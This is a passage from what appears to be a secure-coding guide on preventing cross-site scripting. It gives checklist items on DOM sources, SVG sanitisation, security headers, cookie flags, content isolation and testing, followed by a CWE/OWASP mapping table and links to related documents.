- [ ] URL fragment (`location.hash`), query parameters (`location.search`), and `document.referrer` are treated as untrusted
- [ ] DOM clobbering is mitigated by using module-scoped variables and type validation

### SVG and Special Contexts
- [ ] User-uploaded SVG files are sanitized or converted to raster formats (PNG)
- [ ] SVG content rendered inline is sanitized with DOMPurify's SVG profile
- [ ] User-uploaded SVGs are served from a separate origin with `Content-Security-Policy: script-src 'none'`
- [ ] Markdown rendering output is sanitized before insertion into HTML
- [ ] HTML-to-PDF generation templates encode user data and disable JavaScript execution

### HTTP Headers
- [ ] `X-Content-Type-Options: nosniff` is set on all responses
- [ ] `Content-Type` includes charset (`charset=UTF-8`)
- [ ] Session cookies have `HttpOnly` flag (prevents JavaScript access)
- [ ] Session cookies have `SameSite=Lax` or `SameSite=Strict`
- [ ] Session cookies have `Secure` flag (HTTPS only)

### User Content Isolation
- [ ] User-generated content is served from a separate origin (different domain or subdomain)
- [ ] File uploads are served with `Content-Disposition: attachment` when not displayed inline
- [ ] User-uploaded HTML files are never served from the application's origin

### Testing and Monitoring
- [ ] Static analysis tools (semgrep, CodeQL, eslint-plugin-security) scan for XSS patterns in CI
- [ ] Dynamic analysis (DAST) tools test for XSS in staging environments
- [ ] CSP violation reports are monitored and investigated
- [ ] XSS-related rules are enforced as CI pipeline failures, not warnings
- [ ] Security testing includes DOM XSS testing (not just reflected and stored)
- [ ] Penetration testing covers XSS in all input vectors (forms, URLs, headers, file uploads, WebSockets)

---

## CWE Reference Map

| XSS Type | CWE | OWASP Top 10 |
|----------|-----|-------------|
| Reflected XSS | CWE-79 | A03:2021 Injection |
| Stored XSS | CWE-79 | A03:2021 Injection |
| DOM-Based XSS | CWE-79 | A03:2021 Injection |
| XSS via File Upload (SVG) | CWE-79 | A03:2021 Injection |
| DOM Clobbering | CWE-79 (variant) | A03:2021 Injection |
| Mutation XSS | CWE-79 (variant) | A03:2021 Injection |
| Improper CSP | CWE-1021 | A05:2021 Security Misconfiguration |
| Missing Output Encoding | CWE-116 | A03:2021 Injection |
| URL Scheme Injection | CWE-79 | A03:2021 Injection |

---

## Related Documents

- [Injection Prevention](../secure-coding/injection-prevention.md) -- covers server-side injection classes (SQL, command, template injection)
- [Security Principles](../foundations/security-principles.md) -- defense-in-depth, least privilege
- [Security by Design](../foundations/security-by-design.md) -- secure defaults, fail-safe patterns
